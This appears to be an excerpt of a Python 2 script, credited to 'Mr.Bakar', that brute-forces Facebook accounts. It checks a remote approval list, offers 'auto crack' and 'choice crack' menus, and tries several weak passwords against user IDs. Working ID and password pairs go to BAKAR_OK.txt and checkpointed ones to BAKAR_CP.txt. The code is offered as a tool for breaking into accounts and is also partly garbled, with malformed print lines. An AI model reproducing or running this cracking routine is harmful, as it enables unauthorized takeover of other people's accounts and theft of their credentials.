...
__author__ = 'Mr.Bakar'
__copyright = 'All rights reserved . Copyright  Mr.Bakar'
...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92m    MR B4KK4R UNB3474BL3      .SSS\n\x1b[1;92m   MR B4KK4R UNB3474BL3 \n\x1b[1;91m   MR B4KK4R UNB3474BL3 \n\x1b[1;91m   MR B4KK4R UNB3474BL3 \n\x1b[1;97m   MR B4KK4R UNB3474BL3 \xe2\x80\xa2B4K4R X R4UF\n\x1b[1;97m   MR B4KK4R UNB3474BL3\n\x1b[1;94m   MR B4KK4R UNB3474BL3 \n\x1b[1;94m   MR B4KK4R UNB3474BL3 \n\x1b[1;93m   MR B4KK4R UNB3474BL3\n\x1b[1;96mMR B4KK4R UNB3474BL3\n\x1b[1;96m   MR B4KK4R UNB3474BL3\n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : MR B4KK4R UNB3474BL3\n\x1b[1;97m\xe2\x9e\xa3 Facebook : https://www.facebook.com/B9K9R.L3G39D\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +92310693****\n\x1b[1;91m-----------------------------------------------'

def reg():
    os.system('clear')
    print logo "B4K4R 0N F1R3
    print '' B4K4R
    ...
    r = requests.get('https://raw.githubusercontent.com/bakarlegend/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923117167170')
        reg()
...
def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Bakar\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu():
    ...
    print '\x1b[1;92m[6] Facebook B9K9R.L3G39D'
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Bakar\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        os.system('python2 Bakar.py')
    elif ms == '4':
        v_tok()
    elif ms == '5':
        lout()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Bakar\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Mr Bakar public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93mFor example:1234,112233,223344,000786,334455,1122\x1b[1;91m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mMR B4KK4R UNB3474BL3 0N T4B4H1\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[BAKAR-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/BAKAR_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[BAKAR-CP] ' + uid + ' | ' + pass1
                cp = open('BAKAR_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[BAKAR-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/BAKAR_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[BAKAR-CP] ' + uid + ' | ' + pass2
                    cp = open('BAKAR_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[BAKAR-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/BAKAR_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[BAKAR-CP] ' + uid + ' | ' + pass3
                        cp = open('BAKAR_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[BAKAR-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/BAKAR_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[BAKAR-CP] ' + uid + ' | ' + pass4
                            cp = open('BAKAR_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        print '\x1b[1;92m[BAKAR-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/BAKAR-OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
